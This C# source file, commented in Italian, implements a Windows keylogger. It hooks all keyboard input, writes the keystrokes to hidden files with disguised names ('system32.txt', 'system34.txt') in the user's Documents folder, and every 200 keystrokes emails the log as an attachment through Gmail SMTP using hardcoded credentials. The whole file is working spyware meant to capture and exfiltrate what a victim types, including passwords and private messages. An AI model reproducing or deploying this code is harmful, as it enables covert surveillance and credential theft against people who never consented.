using System;
using System.Diagnostics;
using System.Windows.Forms;
using System.Runtime.InteropServices;
using System.Threading;
using System.IO;
using System.Net;
using System.Net.Mail;
using System.Net.WebSockets;


class Keylogger
{
    private const int WH_KEYBOARD_LL = 13;
    private const int WM_KEYDOWN = 0x0100;
    private static LowLevelKeyboardProc _proc = HookCallback;
    private static IntPtr _hookID = IntPtr.Zero;
    static long numberOfKeystrokes = 0;
    public static void Main()
    {

        _hookID = SetHook(_proc);
        Application.Run();
        UnhookWindowsHookEx(_hookID);
    }

    private static IntPtr SetHook(LowLevelKeyboardProc proc)
    {
        using (Process curProcess = Process.GetCurrentProcess())
        using (ProcessModule curModule = curProcess.MainModule)
        {
            return SetWindowsHookEx(WH_KEYBOARD_LL, proc,
                GetModuleHandle(curModule.ModuleName), 0);
        }
    }

    private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);

    private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
    {
        String filepath = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments);
        // Se il percorso non esiste sulla macchina locale lo creiamo 
        if (!Directory.Exists(filepath))
        {
            Directory.CreateDirectory(filepath);
        }
        string path = (filepath + @"\system34.txt");
        string path2 = (filepath + @"\system32.txt");
        // Se il File non esiste lo creiamo
        if (!File.Exists(path))
        {
            using (StreamWriter sw = File.CreateText(path))
            {

            }
        }

        if (!File.Exists(path2))
        {
            using (StreamWriter sw = File.CreateText(path2))
            {

            }
        }
        File.SetAttributes(path, File.GetAttributes(path) | FileAttributes.Hidden);
        File.SetAttributes(path2, File.GetAttributes(path) | FileAttributes.Hidden);

        if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN)
        {
            int vkCode = Marshal.ReadInt32(lParam);
            Console.WriteLine(vkCode);
            //Console.WriteLine((Keys)vkCode);
            using (StreamWriter sw = File.AppendText(path))
            {
                if (vkCode == 32) sw.Write(" ");
                else if (vkCode == 186) sw.Write("è");
                else if (vkCode == 222) sw.Write("à");
                else if (vkCode == 221) sw.Write("ì");
                else if (vkCode == 191) sw.Write("ù");
                else if (vkCode == 192) sw.Write("ò");
                else if (vkCode == 13) sw.Write("\n");
                else if (vkCode == 219) sw.Write("?");
                else if (vkCode == 49) sw.Write("!");
                else if (vkCode == 65) sw.Write("a");
                else if (vkCode == 66) sw.Write("b");
                else if (vkCode == 67) sw.Write("c");
                else if (vkCode == 68) sw.Write("d");
                else if (vkCode == 69) sw.Write("e");
                else if (vkCode == 70) sw.Write("f");
                else if (vkCode == 71) sw.Write("g");
                else if (vkCode == 72) sw.Write("h");
                else if (vkCode == 73) sw.Write("i");
                else if (vkCode == 74) sw.Write("j");
                else if (vkCode == 75) sw.Write("k");
                else if (vkCode == 76) sw.Write("l");
                else if (vkCode == 77) sw.Write("m");
                else if (vkCode == 78) sw.Write("n");
                else if (vkCode == 79) sw.Write("o");
                else if (vkCode == 80) sw.Write("p");
                else if (vkCode == 81) sw.Write("q");
                else if (vkCode == 82) sw.Write("r");
                else if (vkCode == 83) sw.Write("s");
                else if (vkCode == 84) sw.Write("t");
                else if (vkCode == 85) sw.Write("u");
                else if (vkCode == 86) sw.Write("v");
                else if (vkCode == 87) sw.Write("w");
                else if (vkCode == 88) sw.Write("x");
                else if (vkCode == 89) sw.Write("y");
                else if (vkCode == 90) sw.Write("z");
                else if (vkCode == 106) sw.Write("*");
                else if (vkCode == 107) sw.Write("+");
                else if (vkCode == 109) sw.Write("-");
                else if (vkCode == 110) sw.Write(",");
                else if (vkCode == 111) sw.Write("/");
                else if (vkCode == 160) sw.Write("[Shift]");
                else if (vkCode == 161) sw.Write("[Shift]");
                else if (vkCode == 162) sw.Write("[Ctrl]");
                else if (vkCode == 163) sw.Write("[Ctrl]");
                else if (vkCode == 164) sw.Write("[Alt]");
                else if (vkCode == 165) sw.Write("[Alt]");
                else if (vkCode == 20) sw.Write("[Caps_Lock]");
                else if (vkCode == 27) sw.Write("[Esc]");
                else if (vkCode == 187) sw.Write("=");
                else if (vkCode == 186) sw.Write("ç");
                else if (vkCode == 188) sw.Write(",");
                else if (vkCode == 189) sw.Write("-");
                else if (vkCode == 190) sw.Write(".");
                else if (vkCode == 192) sw.Write("'");
                else if (vkCode == 191) sw.Write(";");
                else if (vkCode == 193) sw.Write("/");
                else if (vkCode == 194) sw.Write(".");
                else if (vkCode == 219) sw.Write("´");
                else if (vkCode == 220) sw.Write("]");
                else if (vkCode == 221) sw.Write("[");
                else if (vkCode == 222) sw.Write("~");
                else if (vkCode == 226) sw.Write("\\");
                else if (vkCode == 46) sw.Write("[Delete]");
                else if (vkCode == 37) sw.Write("[Left]");
                else if (vkCode == 38) sw.Write("[Up]");
                else if (vkCode == 39) sw.Write("[Right]");
                else if (vkCode == 40) sw.Write("[Down]");
                //else sw.Write((Keys)vkCode);

            }
            numberOfKeystrokes++;
            if (numberOfKeystrokes % 200 == 0)
            {
                SendNewMessage();
            }

        }

        return CallNextHookEx(_hookID, nCode, wParam, lParam);
    }

    [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);

    [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    [return: MarshalAs(UnmanagedType.Bool)]
    private static extern bool UnhookWindowsHookEx(IntPtr hhk);

    [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);

    [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    private static extern IntPtr GetModuleHandle(string lpModuleName);

    static void SendNewMessage()
    {
        String folderName = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments);
        string filePath = folderName + @"\system34.txt";
        string filePath1 = folderName + @"\system32.txt";
        System.IO.File.Copy(filePath, filePath1, true);

        String mittente= "aaa@gmail.com";
        String destinatario = "bbb@gmail.com";
        SmtpClient client = new SmtpClient("smtp.gmail.com", 587);
        MailMessage mailMessage = new MailMessage();
        mailMessage.From = new MailAddress(mittente);
        mailMessage.To.Add(destinatario);
        mailMessage.Subject = "Output KeyLogger";
        client.UseDefaultCredentials = false;
        client.EnableSsl = true;
        client.Credentials = new System.Net.NetworkCredential("aaa@gmail.com", "boh");
        mailMessage.Body = "Hi! Ecco qua il file di testo :D\n";
        mailMessage.Attachments.Add(new Attachment(filePath1));
        client.Send(mailMessage);
        Console.WriteLine("Message Sent.");

    }
}
